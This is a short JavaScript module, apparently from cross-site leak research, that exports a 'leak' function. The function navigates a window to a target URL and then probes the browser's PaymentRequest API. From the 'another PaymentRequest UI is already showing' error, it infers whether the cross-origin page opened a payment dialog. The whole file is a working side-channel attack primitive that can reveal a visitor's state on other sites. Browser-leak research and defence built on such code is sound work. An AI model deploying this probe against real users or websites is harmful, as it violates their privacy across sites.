const applePayMethod = {
    supportedMethods: "https://apple.com/apple-pay",
    data: {
        version: 3,
        merchantIdentifier: "merchant.com.example",
        countryCode: "US",
        merchantCapabilities: ["supports3DS"],
        supportedNetworks: ["visa"],
    },
}

const methods = [{supportedMethods: "basic-card"}, applePayMethod];
const details = {
    total: {
        label: "Total",
        amount: {
            currency: "USD",
            value: "1.00",
        },
    },
}

const leak = async (url) => {
    return new Promise(async (r) =>  {
        if (!window.PaymentRequest){
            return r('PaymentRequest not supported.')
        }
        window.WW.location = url
        await sleep(2000)
        let request = new PaymentRequest(methods, details);
        request.show().catch((err) => {
                if(err.message == "Another PaymentRequest UI is already showing in a different tab or window.")
                    return r(1)
                else{
                    return r(0)
                }
            }
        )
        request.abort()
    })
    
}

const sleep = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

export { leak }